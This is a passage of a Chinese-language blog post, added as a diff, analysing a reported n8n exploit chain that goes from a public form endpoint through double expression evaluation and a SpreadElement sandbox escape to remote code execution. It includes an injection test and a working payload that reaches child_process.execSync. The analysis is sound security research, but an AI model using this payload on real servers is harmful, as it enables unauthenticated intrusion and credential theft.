@@ -1,0 +1,898 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>n8n工作流引擎5步攻击链深度解析——从公开表单注入到服务器RCE的完整漏洞链复现 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>n8n工作流引擎5步攻击链深度解析——从公开表单注入到服务器RCE的完整漏洞链复现</h1>
+<time>2026-07-24</time>
+<ul>
+<li>安全</li>
+<li>漏洞分析
+Slug: n8n工作流引擎5步攻击链深度解析从公开表单注入到服务器rce的完整漏洞链复现</li>
+</ul>
+<hr />
+<h2>一、前言：当23万组织的自动化中枢沦为攻击跳板</h2>
+<p>n8n 是一款开源的工作流自动化平台，采用节点式（Node-based）可视化编排模型，允许用户将各类 SaaS 服务、数据库、消息队列、AI 模型串联成自动化流水线。截至目前，n8n 已被 <strong>23 万+组织</strong>采用，Docker Hub 累计拉取量超过 <strong>1亿次</strong>，是低代码自动化赛道的核心基础设施之一。</p>
+<p>然而，工作流自动化平台的本质决定了它必然是一个<strong>高价值攻击目标</strong>：为了编排跨系统的自动化任务，n8n 必须长期存储所有连接系统的凭证——AWS 密钥、数据库密码、OAuth 令牌、各类 SaaS API Key。这些凭证被统一加密存储在 n8n 的数据库中，由一个主加密密钥（<code>N8N_ENCRYPTION_KEY</code> / <code>encryptionKey</code>）保护。一旦攻击者突破 n8n 的边界并获取该主密钥，就等同于拿到了该组织整个自动化生态的"万能钥匙"。</p>
+<p>Pillar Security 研究团队披露了一条由 <strong>五个 CVE</strong> 组成的"五连杀"漏洞链，该链从 n8n 设计上无需认证的公开表单端点切入，经由表达式引擎的双重求值缺陷与沙箱逃逸，最终实现未认证零点击 RCE，并可进一步读取加密密钥、解密全部存储凭证。这五个 CVE 已被 CISA 全部纳入 KEV（Known Exploited Vulnerabilities）目录，全球超过 <strong>12000 台</strong>未及时升级的 n8n 服务器被实际入侵。</p>
+<p>本文将从 n8n 表达式引擎的架构出发，逐层剖析这条攻击链的每一个技术环节，包括双重求值机制、SpreadElement AST 绕过原理、任意文件读取到权限提升的衔接，并给出完整的 PoC 代码、检测规则与修复方案。</p>
+<hr />
+<h2>二、n8n表达式引擎架构深度剖析</h2>
+<p>要理解这条攻击链，必须先理解 n8n 表达式引擎的内部构造。n8n 允许用户在节点配置中使用 <code>={{ }}</code> 语法嵌入动态表达式，这些表达式在运行时被求值，用于实现数据在节点间的动态流转。这个表达式引擎既是 n8n 灵活性的来源，也是整条攻击链的核心攻击面。</p>
+<h3>2.1 表达式引擎整体架构</h3>
+<div class="highlight"><pre><span></span><code><span class="x">flowchart TB</span>
+<span class="x">    subgraph Input[&quot;用户输入层&quot;]</span>
+<span class="x">        U1[&quot;表单提交数据&lt;br/&gt;POST /form/*&quot;]</span>
+<span class="x">        U2[&quot;节点配置中的表达式&lt;br/&gt;=</span><span class="cp">{{</span> <span class="err">$</span><span class="nv">input.first</span><span class="o">()</span><span class="nv">.json.Name</span> <span class="cp">}}</span><span class="x">&quot;]</span>
+<span class="x">    end</span>
+
+<span class="x">    subgraph FormNode[&quot;Form Node 处理层&quot;]</span>
+<span class="x">        F1[&quot;getNodeParameter()&lt;br/&gt;Pass 1: 解析配置表达式&quot;]</span>
+<span class="x">        F2[&quot;prepareFormFields()&lt;br/&gt;getResolvables() 扫描 </span><span class="cp">{{</span> <span class="cp">}}</span><span class="x"> 模式&quot;]</span>
+<span class="x">        F3[&quot;evaluateExpression()&lt;br/&gt;Pass 2: 二次求值&quot;]</span>
+<span class="x">    end</span>
+
+<span class="x">    subgraph Sandbox[&quot;表达式沙箱层&quot;]</span>
+<span class="x">        S1[&quot;表达式预处理&quot;]</span>
+<span class="x">        S2[&quot;@n8n/tournament 编译器&lt;br/&gt;AST 解析与重写&quot;]</span>
+<span class="x">        S3[&quot;VariablePolyfill Transformer&lt;br/&gt;危险标识符重写&quot;]</span>
+<span class="x">        S4[&quot;VM 执行环境&lt;br/&gt;受限全局对象&quot;]</span>
+<span class="x">    end</span>
+
+<span class="x">    subgraph Runtime[&quot;Node.js 运行时&quot;]</span>
+<span class="x">        R1[&quot;process / require / Buffer&lt;br/&gt;(应被沙箱隔离)&quot;]</span>
+<span class="x">        R2[&quot;child_process&lt;br/&gt;(RCE 终点)&quot;]</span>
+<span class="x">    end</span>
+
+<span class="x">    U1 --&gt; F1</span>
+<span class="x">    U2 --&gt; F1</span>
+<span class="x">    F1 --&gt;|&quot;HTML 字段求值&lt;br/&gt;注入用户输入&quot;| F2</span>
+<span class="x">    F2 --&gt;|&quot;发现 </span><span class="cp">{{</span> <span class="cp">}}</span><span class="x"> 模式&quot;| F3</span>
+<span class="x">    F3 --&gt; S1</span>
+<span class="x">    S1 --&gt; S2</span>
+<span class="x">    S2 --&gt; S3</span>
+<span class="x">    S3 --&gt; S4</span>
+<span class="x">    S4 --&gt;|&quot;正常路径&quot;| R1</span>
+<span class="x">    S4 -.-&gt;|&quot;沙箱逃逸&lt;br/&gt;SpreadElement 绕过&quot;| R2</span>
+
+<span class="x">    style F3 fill:#f96,stroke:#333,stroke-width:2px</span>
+<span class="x">    style S3 fill:#f9f,stroke:#333,stroke-width:2px</span>
+<span class="x">    style R2 fill:#f66,stroke:#333,stroke-width:2px</span>
+</code></pre></div>
+
+<h3>2.2 表达式求值的两个阶段</h3>
+<p>n8n 的表达式求值并非单次完成。在 Form Node 的场景中，存在一个致命的<strong>双重求值（Double Evaluation）</strong>设计：</p>
+<p><strong>Pass 1 —— 配置解析阶段</strong>：Form Node 在渲染表单时，会通过 <code>getNodeParameter()</code> 读取节点的配置项。如果配置中包含 <code>={{ }}</code> 表达式（例如 HTML 字段配置为 <code>={{ $input.first().json["Name"] }}</code>），引擎会将其求值，把用户之前提交的 <code>Name</code> 字段值直接拼接进 HTML 字符串。这一步的语义是"把用户数据渲染到表单 HTML 中"。</p>
+<p><strong>Pass 2 —— 表单字段准备阶段</strong>：<code>prepareFormFields()</code> 函数在处理渲染后的 HTML 时，会调用 <code>getResolvables()</code> 扫描其中的 <code>{{ }}</code> 模式。任何被识别为"可解析"（resolvable）的模式，都会被传入 <code>evaluateExpression()</code> 进行<strong>第二次求值</strong>。这一步的设计本意是处理配置中嵌套的动态表达式，但由于 Pass 1 已经将用户输入注入了 HTML，攻击者可以通过在表单字段中提交包含 <code>{{ }}</code> 的内容，使自己的 payload 在 Pass 2 被引擎当作合法表达式执行。</p>
+<h3>2.3 @n8n/tournament 编译器与 VariablePolyfill Transformer</h3>
+<p>无论 Pass 1 还是 Pass 2，表达式的实际执行都要经过 n8n 的表达式沙箱。该沙箱的核心是 <code>@n8n/tournament</code> 编译器，它负责将用户表达式编译为可执行代码。沙箱的关键防御机制是 <strong>VariablePolyfill Transformer</strong>——一个 AST（抽象语法树）层面的标识符重写器。</p>
+<p>其工作原理如下：</p>
+<ol>
+<li><strong>AST 解析</strong>：<code>@n8n/tournament</code> 将表达式字符串解析为 JavaScript AST。</li>
+<li><strong>遍历与重写</strong>：VariablePolyfill Transformer 遍历 AST，对每一个 <strong>Identifier（标识符）节点</strong>进行检查。</li>
+<li><strong>危险标识符拦截</strong>：当遇到 <code>process</code>、<code>require</code>、<code>module</code>、<code>Buffer</code> 等危险全局标识符时，Transformer 会将其重写为一个安全的 polyfill 包装，或在 blocked 列表中直接拦截。</li>
+<li><strong>AST 父节点类型检查</strong>：Transformer 维护了一个包含 <strong>130+ 种 AST 节点类型</strong>的检查列表，用于判断标识符出现的上下文是否安全。</li>
+</ol>
+<p>这套机制在 n8n v2.4.0 时经历过一轮重大加固——当时修复了 9 个安全问题，那些修复主要落在<strong>运行时 sanitizer 层</strong>，即在表达式求值前后对结果进行消毒。然而，CVE-2026-27577 的 SpreadElement 绕过发生在<strong>编译阶段的 AST 重写层</strong>，完全绕过了运行时 sanitizer。这正是该漏洞与之前修复的本质区别，也是其危害等级极高的原因。</p>
+<hr />
+<h2>三、CVE-2026-27493：Form Node双重求值表达式注入</h2>
+<h3>3.1 攻击面：无需认证的公开表单端点</h3>
+<p>n8n 的 Form Node 提供了一种"无代码表单"能力——用户无需编写任何前端代码，即可通过 n8n 创建可接收外部提交的 Web 表单。这些表单通过 <code>/form/*</code> 路径对外暴露。</p>
+<div class="highlight"><pre><span></span><code>https://target-n8n-instance.com/form/contact-us
+</code></pre></div>
+
+<p>该端点在设计上<strong>明确不需要认证</strong>。任何人都可以向该端点提交 POST 请求。据 Pillar Security 统计，全球有超过 <strong>50000 个</strong> n8n 表单端点暴露在公网上，可通过简单的网络空间测绘（如 FOFA、Shodan）定位。</p>
+<p>这种"无认证"设计本身是合理的——表单本就是给外部用户填写的。问题出在表单提交后的数据处理流程中，用户输入未经充分净化就被送入了表达式引擎。</p>
+<h3>3.2 双重求值的致命逻辑</h3>
+<p>以下是 Form Node 处理一次表单提交的简化伪代码，标注了两次求值发生的位置：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// === Form Node 表单处理流程（简化伪代码）===</span>
+
+<span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">handleFormSubmission</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">formData</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// 从节点配置中读取 HTML 模板</span>
+<span class="w">    </span><span class="c1">// 假设配置为: html = &#39;={{ $input.first().json[&quot;Name&quot;] }}&#39;</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">htmlConfig</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">node</span><span class="p">.</span><span class="nx">getParameter</span><span class="p">(</span><span class="s1">&#39;html&#39;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// [Pass 1] getNodeParameter 解析配置中的表达式</span>
+<span class="w">    </span><span class="c1">// 这里 $input.first().json[&quot;Name&quot;] 会取到用户刚刚提交的 Name 字段值</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">renderedHtml</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">evaluateExpression</span><span class="p">(</span><span class="nx">htmlConfig</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">$input</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">first</span><span class="o">:</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">({</span><span class="w"> </span><span class="nx">json</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">Name</span><span class="o">:</span><span class="w"> </span><span class="nx">formData</span><span class="p">.</span><span class="nx">Name</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">})</span><span class="w"> </span><span class="p">}</span>
+<span class="w">    </span><span class="p">});</span>
+
+<span class="w">    </span><span class="c1">// 此时 renderedHtml 中已经包含了用户提交的 Name 值</span>
+<span class="w">    </span><span class="c1">// 如果用户提交 Name = &#39;{{ EVIL_PAYLOAD }}&#39;</span>
+<span class="w">    </span><span class="c1">// 则 renderedHtml = &#39;{{ EVIL_PAYLOAD }}&#39;</span>
+
+<span class="w">    </span><span class="c1">// [Pass 2] prepareFormFields 扫描渲染后的 HTML</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">fields</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">prepareFormFields</span><span class="p">(</span><span class="nx">renderedHtml</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">fields</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kd">function</span><span class="w"> </span><span class="nx">prepareFormFields</span><span class="p">(</span><span class="nx">html</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// getResolvables 扫描 html 中的所有 {{ }} 模式</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">resolvables</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getResolvables</span><span class="p">(</span><span class="nx">html</span><span class="p">);</span>
+<span class="w">    </span><span class="c1">// resolvables = [&#39;{{ EVIL_PAYLOAD }}&#39;]</span>
+
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">html</span><span class="p">;</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">const</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">resolvables</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 对每一个匹配到的模式，调用 evaluateExpression 再次求值！</span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="nx">inner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/{{\s*(.+?)\s*}}/</span><span class="p">)[</span><span class="mf">1</span><span class="p">];</span><span class="w"> </span><span class="c1">// 提取 {{ }} 内部内容</span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="nx">evaluated</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">evaluateExpression</span><span class="p">(</span><span class="nx">inner</span><span class="p">);</span><span class="w">  </span><span class="c1">// &lt;-- 第二次求值</span>
+<span class="w">        </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">result</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="nx">evaluated</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>关键问题在于 <code>prepareFormFields</code> 中的循环：它对渲染后的 HTML 再次执行 <code>getResolvables()</code> + <code>evaluateExpression()</code>。如果攻击者在表单字段中提交的内容恰好包含 <code>{{ }}</code> 模式，这些内容在 Pass 1 被原样注入 HTML 后，会在 Pass 2 被引擎识别为合法表达式并执行。</p>
+<h3>3.3 注入路径验证</h3>
+<p>假设 n8n 实例中存在一个 Form Node，其 HTML 字段配置为引用用户输入：</p>
+<div class="highlight"><pre><span></span><code><span class="x">=</span><span class="cp">{{</span> <span class="err">$</span><span class="nv">input.first</span><span class="o">()</span><span class="nv">.json</span><span class="o">[</span><span class="s2">&quot;Name&quot;</span><span class="o">]</span> <span class="cp">}}</span>
+</code></pre></div>
+
+<p>攻击者在 Name 字段提交：</p>
+<div class="highlight"><pre><span></span><code><span class="cp">{{</span> <span class="m">7</span><span class="o">*</span><span class="m">7</span> <span class="cp">}}</span>
+</code></pre></div>
+
+<p>执行流程：
+1. <strong>Pass 1</strong>：<code>={{ $input.first().json["Name"] }}</code> 求值为 <code>{{ 7*7 }}</code>（用户输入被注入 HTML）。
+2. <strong>Pass 2</strong>：<code>getResolvables()</code> 扫描到 <code>{{ 7*7 }}</code>，提取内部 <code>7*7</code>，<code>evaluateExpression('7*7')</code> 求值为 <code>49</code>。</p>
+<p>最终返回结果为 <code>49</code>，证明注入成功。攻击者只需将 <code>7*7</code> 替换为任意恶意表达式，即可实现代码执行。这就是一个<strong>未认证、零点击</strong>的 RCE 前置条件——攻击者只需向公开表单端点发送一个 POST 请求。</p>
+<hr />
+<h2>四、CVE-2026-27577：SpreadElement沙箱逃逸</h2>
+<p>CVE-2026-27493 提供了注入入口，但表达式引擎仍有沙箱保护——<code>process</code>、<code>require</code> 等危险标识符会被 VariablePolyfill Transformer 拦截。CVE-2026-27577 正是击穿了这层沙箱防御。</p>
+<h3>4.1 VariablePolyfill Transformer 的防御逻辑</h3>
+<p>VariablePolyfill Transformer 的核心是一个对 AST Identifier 节点的遍历器，配合一个 switch-case 结构判断标识符出现的上下文。其简化逻辑如下：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// @n8n/tournament VariablePolyfill Transformer 简化伪代码</span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">BLOCKED_IDENTIFIERS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;process&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;require&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;module&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Buffer&#39;</span><span class="p">,</span><span class="w"> </span><span class="cm">/* ... */</span><span class="p">];</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">SAFE_PARENT_NODE_TYPES</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="c1">// 130+ 种 AST 节点类型</span>
+<span class="w">    </span><span class="s1">&#39;MemberExpression&#39;</span><span class="p">,</span><span class="w">       </span><span class="c1">// process.env -&gt; MemberExpression</span>
+<span class="w">    </span><span class="s1">&#39;CallExpression&#39;</span><span class="p">,</span><span class="w">         </span><span class="c1">// require(&#39;x&#39;) -&gt; CallExpression</span>
+<span class="w">    </span><span class="s1">&#39;NewExpression&#39;</span><span class="p">,</span>
+<span class="w">    </span><span class="s1">&#39;AssignmentExpression&#39;</span><span class="p">,</span>
+<span class="w">    </span><span class="s1">&#39;VariableDeclarator&#39;</span><span class="p">,</span>
+<span class="w">    </span><span class="s1">&#39;BinaryExpression&#39;</span><span class="p">,</span>
+<span class="w">    </span><span class="s1">&#39;LogicalExpression&#39;</span><span class="p">,</span>
+<span class="w">    </span><span class="s1">&#39;ConditionalExpression&#39;</span><span class="p">,</span>
+<span class="w">    </span><span class="s1">&#39;ArrayExpression&#39;</span><span class="p">,</span>
+<span class="w">    </span><span class="s1">&#39;ObjectExpression&#39;</span><span class="p">,</span>
+<span class="w">    </span><span class="s1">&#39;Property&#39;</span><span class="p">,</span>
+<span class="w">    </span><span class="s1">&#39;SpreadElement&#39;</span><span class="p">,</span><span class="w">          </span><span class="c1">// 注：原版代码中实际缺失此 case！</span>
+<span class="w">    </span><span class="c1">// ... 共 130+ 种</span>
+<span class="p">];</span>
+
+<span class="kd">function</span><span class="w"> </span><span class="nx">visitIdentifier</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">node</span><span class="p">,</span><span class="w"> </span><span class="nx">parent</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// 检查标识符名是否在危险列表中</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">BLOCKED_IDENTIFIERS</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">node</span><span class="p">.</span><span class="nx">name</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"> </span><span class="c1">// 非危险标识符，放行</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// 检查父节点类型，决定是否需要重写</span>
+<span class="w">    </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="nx">parent</span><span class="p">.</span><span class="nx">type</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;MemberExpression&#39;</span><span class="o">:</span>
+<span class="w">            </span><span class="nx">rewriteToPolyfill</span><span class="p">(</span><span class="nx">path</span><span class="p">);</span><span class="w">  </span><span class="c1">// process -&gt; __n8n_polyfill_process</span>
+<span class="w">            </span><span class="k">break</span><span class="p">;</span>
+<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;CallExpression&#39;</span><span class="o">:</span>
+<span class="w">            </span><span class="nx">rewriteToPolyfill</span><span class="p">(</span><span class="nx">path</span><span class="p">);</span><span class="w">  </span><span class="c1">// require(&#39;x&#39;) -&gt; __n8n_polyfill_require</span>
+<span class="w">            </span><span class="k">break</span><span class="p">;</span>
+<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;VariableDeclarator&#39;</span><span class="o">:</span>
+<span class="w">            </span><span class="nx">rewriteToPolyfill</span><span class="p">(</span><span class="nx">path</span><span class="p">);</span>
+<span class="w">            </span><span class="k">break</span><span class="p">;</span>
+<span class="w">        </span><span class="c1">// ... 130+ 个 case</span>
+<span class="w">        </span><span class="c1">// case &#39;SpreadElement&#39;:  &lt;-- 这个 case 不存在！</span>
+<span class="w">        </span><span class="c1">//     rewriteToPolyfill(path);</span>
+<span class="w">        </span><span class="c1">//     break;</span>
+<span class="w">        </span><span class="k">default</span><span class="o">:</span>
+<span class="w">            </span><span class="c1">// fall through：不执行任何重写，标识符原样保留</span>
+<span class="w">            </span><span class="k">break</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>4.2 SpreadElement AST 绕过原理</h3>
+<p>在 JavaScript 语法中，<strong>SpreadElement</strong>（展开元素）是 <code>...</code> 语法的 AST 节点表示，用于将可迭代对象展开到数组或对象中：</p>
+<div class="highlight"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">...</span><span class="nx">process</span><span class="w"> </span><span class="p">};</span><span class="w">  </span><span class="c1">// process 出现在 SpreadElement 的 argument 位置</span>
+<span class="c1">// 对应 AST:</span>
+<span class="c1">// ObjectExpression</span>
+<span class="c1">//   └── Property</span>
+<span class="c1">//        └── SpreadElement</span>
+<span class="c1">//             └── Identifier (name: &quot;process&quot;)</span>
+</code></pre></div>
+
+<p>当 VariablePolyfill Transformer 遍历到 <code>process</code> 这个 Identifier 节点时，它会检查其父节点。此时父节点是 <code>SpreadElement</code>。由于 Transformer 的 switch-case 中<strong>没有 <code>SpreadElement</code> 这个 case</strong>（它不在检查列表中），代码执行落入 <code>default</code> 分支，<strong>不执行任何重写操作</strong>。</p>
+<p>这意味着 <code>process</code> 标识符被原样保留在编译后的代码中，沙箱的标识符拦截机制被完全绕过。</p>
+<p>以下是 AST 结构的对比分析：</p>
+<div class="highlight"><pre><span></span><code><span class="o">===</span><span class="w"> </span><span class="err">安全路径：</span><span class="n">MemberExpression</span><span class="w"> </span><span class="o">===</span>
+<span class="err">表达式</span><span class="o">:</span><span class="w"> </span><span class="nf">process</span><span class="p">.</span><span class="n">env</span>
+<span class="n">AST</span><span class="o">:</span>
+<span class="w">  </span><span class="n">MemberExpression</span><span class="w"> </span><span class="p">(</span><span class="n">object</span><span class="o">=</span><span class="n">Identifier</span><span class="p">(</span><span class="nf">process</span><span class="p">),</span><span class="w"> </span><span class="n">property</span><span class="o">=</span><span class="n">Identifier</span><span class="p">(</span><span class="n">env</span><span class="p">))</span>
+<span class="w">  </span><span class="o">-&gt;</span><span class="w"> </span><span class="err">父节点类型</span><span class="o">:</span><span class="w"> </span><span class="n">MemberExpression</span>
+<span class="w">  </span><span class="o">-&gt;</span><span class="w"> </span><span class="err">命中</span><span class="w"> </span><span class="n">switch</span><span class="w"> </span><span class="kr">case</span><span class="w"> </span><span class="s">&#39;MemberExpression&#39;</span>
+<span class="w">  </span><span class="o">-&gt;</span><span class="w"> </span><span class="err">执行重写</span><span class="o">:</span><span class="w"> </span><span class="nf">process</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">__n8n_polyfill_process</span><span class="w"> </span><span class="p">(</span><span class="err">安全</span><span class="p">)</span>
+<span class="w">  </span><span class="o">-&gt;</span><span class="w"> </span><span class="err">结果</span><span class="o">:</span><span class="w"> </span><span class="n">__n8n_polyfill_process</span><span class="p">.</span><span class="n">env</span>
+
+<span class="o">===</span><span class="w"> </span><span class="err">绕过路径：</span><span class="n">SpreadElement</span><span class="w"> </span><span class="o">===</span>
+<span class="err">表达式</span><span class="o">:</span><span class="w"> </span><span class="p">{...</span><span class="nf">process</span><span class="p">}</span>
+<span class="n">AST</span><span class="o">:</span>
+<span class="w">  </span><span class="n">ObjectExpression</span>
+<span class="w">    </span><span class="err">└──</span><span class="w"> </span><span class="n">SpreadElement</span>
+<span class="w">         </span><span class="err">└──</span><span class="w"> </span><span class="n">Identifier</span><span class="w"> </span><span class="p">(</span><span class="n">name</span><span class="o">:</span><span class="w"> </span><span class="s">&quot;process&quot;</span><span class="p">)</span>
+<span class="w">  </span><span class="o">-&gt;</span><span class="w"> </span><span class="err">父节点类型</span><span class="o">:</span><span class="w"> </span><span class="n">SpreadElement</span>
+<span class="w">  </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">switch</span><span class="w"> </span><span class="err">中无</span><span class="w"> </span><span class="s">&#39;SpreadElement&#39;</span><span class="w"> </span><span class="kr">case</span>
+<span class="w">  </span><span class="o">-&gt;</span><span class="w"> </span><span class="err">落入</span><span class="w"> </span><span class="n">default</span><span class="w"> </span><span class="err">分支</span>
+<span class="w">  </span><span class="o">-&gt;</span><span class="w"> </span><span class="err">不执行重写</span><span class="o">:</span><span class="w"> </span><span class="nf">process</span><span class="w"> </span><span class="err">原样保留</span><span class="w"> </span><span class="p">(</span><span class="err">危险</span><span class="o">!</span><span class="p">)</span>
+<span class="w">  </span><span class="o">-&gt;</span><span class="w"> </span><span class="err">结果</span><span class="o">:</span><span class="w"> </span><span class="p">{...</span><span class="nf">process</span><span class="p">}</span><span class="w">  </span><span class="p">(</span><span class="nf">process</span><span class="w"> </span><span class="err">仍是真实的</span><span class="w"> </span><span class="n">Node</span><span class="p">.</span><span class="n">js</span><span class="w"> </span><span class="err">全局对象</span><span class="p">)</span>
+</code></pre></div>
+
+<h3>4.3 完整 Payload 解析</h3>
+<p>利用 SpreadElement 绕过，攻击者可以构造如下 payload：</p>
+<div class="highlight"><pre><span></span><code><span class="o">=</span><span class="p">{{</span>
+<span class="w">  </span><span class="p">((</span><span class="nx">g</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span>
+<span class="w">    </span><span class="nx">g</span>
+<span class="w">      </span><span class="p">.</span><span class="nx">getBuiltinModule</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">)</span>
+<span class="w">      </span><span class="p">.</span><span class="nx">execSync</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span>
+<span class="w">      </span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span>
+<span class="w">  </span><span class="p">)({...</span><span class="nx">process</span><span class="p">})</span>
+<span class="p">}}</span>
+</code></pre></div>
+
+<p>逐层拆解这个 payload 的执行逻辑：</p>
+<ol>
+<li>
+<p><strong><code>{...process}</code></strong>：利用 SpreadElement 将 <code>process</code> 对象展开。由于 AST 绕过，<code>process</code> 未被重写，保持为真实的 Node.js <code>process</code> 全局对象。展开后的对象携带了 <code>process</code> 的所有可枚举属性及原型链引用。</p>
+</li>
+<li>
+<p><strong><code>(g) =&gt; ...</code></strong>：定义一个箭头函数，参数 <code>g</code> 接收上一步展开后的对象。这个对象由于继承自 <code>process</code>，可以通过原型链或属性访问获取到内部模块加载能力。</p>
+</li>
+<li>
+<p><strong><code>g.getBuiltinModule('child_process')</code></strong>：通过 <code>process</code> 对象上的 <code>getBuiltinModule</code> 方法（或等价的内部 API）加载 Node.js 内置的 <code>child_process</code> 模块。这一步直接获取了系统命令执行能力。</p>
+</li>
+<li>
+<p><strong><code>.execSync('id')</code></strong>：同步执行系统命令 <code>id</code>。</p>
+</li>
+<li>
+<p><strong><code>.toString()</code></strong>：将命令输出转换为字符串，以便在表达式求值结果中返回。</p>
+</li>
+</ol>
+<p>这个 payload 之所以能成功，关键在于 <code>{...process}</code> 中的 <code>process</code> 标识符在 AST 重写阶段未被拦截，从而在 VM 执行阶段仍然是真实的、未被 polyfill 包装的全局对象。攻击者通过它作为跳板，获取了 <code>child_process</code> 模块的引用，完成了从"受限沙箱表达式"到"任意系统命令执行"的跨越。</p>
+<h3>4.4 与 v2.4.0 安全修复的本质区别</h3>
+<p>n8n 在 v2.4.0 版本曾修复过 9 个表达式引擎安全问题。理解这批修复与 SpreadElement 绕过的区别，对于防御者至关重要：</p>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>v2.4.0 的 9 个修复</th>
+<th>CVE-2026-27577 SpreadElement 绕过</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>防御层位置</strong></td>
+<td>运行时 sanitizer 层</td>
+<td>编译阶段 AST 重写层</td>
+</tr>
+<tr>
+<td><strong>作用机制</strong></td>
+<td>在表达式求值前后对输入输出做正则过滤/结果消毒</td>
+<td>在 AST 遍历时对危险标识符做重写</td>
+</tr>
+<tr>
+<td><strong>绕过方式</strong></td>
+<td>寻找 sanitizer 正则的边界条件（如编码、嵌套）</td>
+<td>利用 AST 节点类型检查列表的遗漏</td>
+</tr>
+<tr>
+<td><strong>影响范围</strong></td>
+<td>单个表达式的结果被过滤</td>
+<td>标识符本身未被拦截，整个沙箱形同虚设</td>
+</tr>
+<tr>
+<td><strong>修复难度</strong></td>
+<td>补充正则规则即可</td>
